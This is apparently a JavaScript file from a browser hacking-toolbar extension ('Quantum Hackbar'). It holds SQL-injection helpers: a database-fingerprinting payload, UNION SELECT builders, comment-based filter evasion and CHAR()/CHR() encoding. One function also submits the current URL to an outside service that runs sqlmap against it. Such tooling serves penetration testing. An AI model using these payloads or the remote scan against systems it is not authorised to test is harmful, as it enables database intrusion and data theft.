/**
 * SQL-Related Functions
 */

// add basic SQL info column to the payload
function basicInfoColum()
{
    setSelectedText( 'CONCAT(user(),0x203a3a20,database(),0x203a3a20,version())' );
}


// add SQL union select statement to the payload
function unionSelectStatement()
{
    let out = 'UNION SELECT ';
    
    exec( 'prompt( "How many columns?", 10 )' ).then( columns => {
        columns = parseInt( columns );

        for( let i=1; i<=columns; i++ )
            out += i + ',';

        out = out.slice( 0, -1 );
        setSelectedText( out );
    });
}


// replace spaces in payload with inline SQL comments
function spacesToInlineComments()
{
    activeInput.value = activeInput.value.replace( /\s+/g, '/**/' );
}


// mysql convert
function mysqlConvert( encoding )
{
    let text = getSelectedText();
    
    if( text !== false )
        setSelectedText( 'CONVERT(' + text + ' USING ' + encoding + ')' );
}


// SQL CHAR()
function SQLCHAR( db )
{
    let str = getSelectedText();

    if( str == false )
        return;

    let charStringArray = [];
    let decimal;

    for ( let c = 0; c < str.length; c++ ) 
    {
        decimal = str.charCodeAt(c);
        charStringArray.push(decimal);
    }

    let charString = '';

    switch ( db ) 
    {
        case "mysql":
            charString = 'CHAR(' + charStringArray.join( ', ') + ')';
            break;

        case "mssql":
            charString = ' CHAR(' + charStringArray.join( ') + CHAR(') + ')';
            break;

        case "oracle":
            charString = ' CHR(' + charStringArray.join( ') || CHR(') + ')';
            break;
    }

    setSelectedText( charString );
}


// run sqlmap on the current url
async function sqlmap()
{
    let url = payloadInput.value;

    // if URL is not loaded, we will load it and then execute sqlmap
    if( !url )
    {
        await loadURL();
        url = payloadInput.value;
    }

    showLoader();

    let sqlmap = 'https://suip.biz/?act=sqlmap';

    ajax( sqlmap, 'POST', 
        jsonToPostData({ url: url }),
        { 
            'Origin': 'Quantum Hackbar',
            'content-type': 'application/x-www-form-urlencoded',
            'Referer': 'https://suip.biz/?act=sqlmap'
        })
    
    .then( res => {
        return res.text();
    })
    
    .then( html => {

        // parse HTML and get report link
        let el = document.createElement( 'html' );
        el.innerHTML = html;

        let link = el.querySelector( 'a[href^="https://suip.biz/?act=report"]' );

        // send message to background page and create new tab
        browser.runtime.sendMessage({
            action: 'newTab',
            url: link.href
        })
        
        .then( tab => {
            hideLoader();
        });
    });
}